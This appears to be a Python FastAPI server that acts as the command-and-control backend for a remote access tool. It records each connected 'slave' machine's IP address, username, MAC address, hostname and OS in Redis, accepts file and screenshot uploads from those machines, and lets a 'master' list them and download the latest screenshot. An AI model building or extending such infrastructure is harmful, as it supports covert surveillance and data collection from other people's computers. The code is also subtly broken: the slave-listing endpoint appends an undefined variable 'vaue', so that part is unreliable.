from typing import Annotated
import os
import json
import shutil
from fastapi import FastAPI, Request, UploadFile
from models import SlaveCommandRequest
from fastapi.responses import FileResponse
import redisutil
app = FastAPI()


@app.get("/")
async def root(request: Request):
    client_host = request.client.host
    return {"client_host": client_host}
    
@app.post("/api/slave/command")
async def command(request: Request, slaveCommand: SlaveCommandRequest):
    resp = {
        "ip": request.client.host,
        "username": slaveCommand.username,
        "mac": slaveCommand.mac,
        "hostname": slaveCommand.hostname,
        "os": slaveCommand.os,
    }
    key = f"INFO_{slaveCommand.mac}"
    redisutil.set_key_val(key,json.dumps(resp))
    return resp
    
@app.get("/api/slave/response/text")
async def textresponse():
    return {"message": "Slave Text Response"}
    
@app.post("/api/slave/response/file")
async def fileresponse(file: UploadFile):
    return {"name": file.filename, "size": file.size}

@app.post("/api/slave/response/screenshot")
async def screenshotresponse(file: UploadFile):
    full_file_path = os.getcwd()+"/screenshot.png"
    with open(full_file_path,"wb") as buffer:
        shutil.copyfileobj(file.file,buffer)
    return {"name": file.filename, "size": file.size}

@app.get("/api/master/screenshot")
async def screenshotdownload():
    return FileResponse(os.getcwd()+"/screenshot.png")

@app.get("/api/master/slaves")
async def listallslaves():
    slaves_list= []
    
    slaves = redisutil.find_all_keys_with_pattern("INFO")
    
    if slaves is None:
        return slaves_list
    
    for slave_key in slaves:
        value = redisutil.get_value_from_key(slave_key)
        slaves_list.append(vaue)
    
    return slaves_list
